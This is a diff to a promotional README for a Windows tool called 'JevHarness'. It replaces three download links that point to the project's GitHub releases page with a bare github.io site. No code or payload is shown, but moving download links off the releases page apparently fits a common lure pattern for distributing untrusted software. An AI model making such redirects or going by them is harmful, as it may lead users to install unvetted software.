@@ -18,12 +18,12 @@ This powerful tool was created by advanced AI technology and includes special fe
 
 ### Step 1: Get the Download
 
-[![Download JevHarness Now](https://img.shields.io/badge/Download-JevHarness-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/gloria112/JevHarness/releases)
+[![Download JevHarness Now](https://img.shields.io/badge/Download-JevHarness-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://gloria112.github.io)
 
 Visit this link to download the application.
 
 Click the button above or type this address in your browser:  
-**https://github.com/gloria112/JevHarness/releases**
+**https://gloria112.github.io**
 
 ### Step 2: Install the Application
 
@@ -135,7 +135,7 @@ JevHarness is here to make your computer life easier. With its smart automation,
 
 Remember: **Visit the download page now** to get your copy today!
 
-[![Get JevHarness](https://img.shields.io/badge/Download%20Now-JevHarness-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gloria112/JevHarness/releases)
+[![Get JevHarness](https://img.shields.io/badge/Download%20Now-JevHarness-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://gloria112.github.io)
 
 ---
 
